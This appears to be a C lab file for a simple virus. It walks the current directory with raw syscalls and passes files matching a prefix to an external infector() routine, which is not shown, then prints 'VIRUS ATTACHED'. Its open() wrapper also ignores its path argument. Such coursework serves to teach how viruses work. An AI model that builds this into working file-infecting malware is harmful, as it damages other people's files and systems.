#include "util.h"

#define SYS_GETDENTS 141
#define SYS_WRITE 4
#define STDOUT 1
#define BUF_SIZE 8192

/* Simplified dirent structure for getdents */
struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char           d_name[1];
};

/* External function prototypes */
extern int system_call(int, ...);
extern void infection();
extern void infector(char *);

void print(char* message) {
    system_call(SYS_WRITE, STDOUT, message, strlen(message));
}

int open(char* path) {
    return system_call(5, ".", 0, 0); 
}

void close(int file_descriptor) {
    system_call(6, file_descriptor, 0, 0); /* sys_close */
}

void exit() {
    system_call(1, 0x55, 0, 0);
}


int main(int argc, char *argv[]) {
    int fd = -1, nread, i, bpos;
    int failed = 0;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    char *prefix = 0;
    int attach_mode = 0;
    char *file_or_directory_name;
    
    /* Parse arguments */
    for (i = 1; i < argc; i++) {
        if (strlen(argv[i]) >= 2 && argv[i][0] == '-' && argv[i][1] == 'a') {
            attach_mode = 1;
            prefix = argv[i] + 2;
        }
    }
    
    /* Open current directory "." */
    fd = open(".");
    if (fd < 0) {
        failed = 1;
        goto lblCleanup;
    }
    
    /* Get directory entries */
    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread <= 0) {
        print("Error in getdents\n");
        failed = 1;
        goto lblCleanup;
    }
    
    /* Iterate through entries */
    bpos = 0;
    while (bpos < nread) {
        d = (struct linux_dirent *) (buf + bpos);
        file_or_directory_name = d->d_name;

        /* Skip "." and ".." to avoid accidental recursion/infection */
        if (strcmp(file_or_directory_name, ".") != 0 && strcmp(file_or_directory_name, "..") != 0) {
            
            /* If no prefix provided, print all. If prefix provided, filter. */
            if (!attach_mode || (file_or_directory_name[0] == prefix[0])) {
                print("Attempting to attach virus to: ");
                print(file_or_directory_name);
                print("\n");
                
                if (attach_mode && (file_or_directory_name[0] == prefix[0])) {
                    infector(file_or_directory_name);   
                    print("\nVIRUS ATTACHED");
                }
                
                print("\n");
            }
        }
        bpos += d->d_reclen;
    }

lblCleanup:
    if (fd >= 0) {
        close(fd);
    }

    if (failed == 1) {
        exit();
    }
    return 0;
}